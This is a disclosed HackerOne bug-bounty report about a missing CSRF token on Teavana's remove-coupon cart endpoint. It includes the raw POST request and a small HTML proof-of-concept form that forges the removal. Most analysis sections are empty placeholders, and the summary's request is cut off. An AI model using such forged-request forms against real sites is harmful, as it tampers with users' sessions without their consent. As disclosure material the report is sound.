# Missing CSRF Token On Remove Coupun From Cart

## Metadata
- **Source:** HackerOne
- **Report:** 227726 | https://hackerone.com/reports/227726
- **Submitted:** 2017-05-11
- **Reporter:** apapedulimu
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi,
When remove coupun, there's no CSRF token, at this time i use `███████` Coupun to reproduce it.

__Vuln Request__
```
POST /on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon HTTP/1.1
Host: www.teavana.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Cont

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi,
When remove coupun, there's no CSRF token, at this time i use `███████` Coupun to reproduce it.

__Vuln Request__
```
POST /on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon HTTP/1.1
Host: www.teavana.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.teavana.com/us/en/cart
Content-Length: 17
Cookie: some cookie
Connection: close

couponCode=██████████
```

__Poc Code__
```
<html>
<body>
<form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon" method="POST">
<input type="hidden" name="couponCode" value="███" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

```

Edit the `coupunCode` with name of the coupun.

Thanks, 
 If you need video, i will create one !

</details>

---
*Analysed by Claude on 2026-05-24*
